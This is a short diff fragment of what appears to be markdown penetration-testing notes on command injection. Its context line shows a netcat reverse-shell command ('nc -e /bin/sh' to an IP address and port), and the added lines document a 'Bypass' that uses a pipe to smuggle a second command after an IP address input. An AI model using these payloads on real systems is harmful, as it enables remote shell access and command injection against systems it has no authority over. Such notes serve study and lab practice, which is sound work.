@@ -33,4 +33,5 @@ nc -e /bin/sh 10.20.14 8080
 ```
 
 ## Bypass
-- Use ```|```
+- Use ```|``` between two code
+  - ```10.20.14.208 | pwd```
